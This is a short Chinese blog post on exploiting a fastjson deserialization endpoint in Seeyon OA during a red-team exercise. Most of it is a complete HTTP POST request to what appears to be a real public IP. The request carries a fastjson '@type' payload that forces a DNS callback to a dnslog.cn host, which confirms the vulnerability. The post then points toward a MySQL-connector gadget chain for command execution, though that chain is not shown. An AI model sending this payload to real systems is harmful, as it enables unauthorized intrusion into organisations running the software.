---
layout: post
title: SeeyonFastjson利用链

---

## 0x01  前言

前段时间刚结束一场hvv，现场遇到了这样的情况，存在seeyon的fastjson接口但是利用链不行。

后来换了mysql connector的利用链，前提是seeyon的数据库用的是Mysql

## 0x02  接口1

```
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: 125.35.108.68:9090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://125.35.108.68:9090/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://125.35.108.68:9090/seeyon/main.do
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=9845FB928E346136D2356099A6862683; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

_json_params={"@type":"java.net.Inet4Address","val":"k6suli.dnslog.cn"}
```

dnslog有回显，但是看了网上执行命令的方法，都是一直失败

安装的时候有这么个东西，就是后文利用链里面需要的mysql-connector

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105142552.png)

这个要装对应的jdbc驱动，比如mysql-connector-java-5.1.38-bin.jar



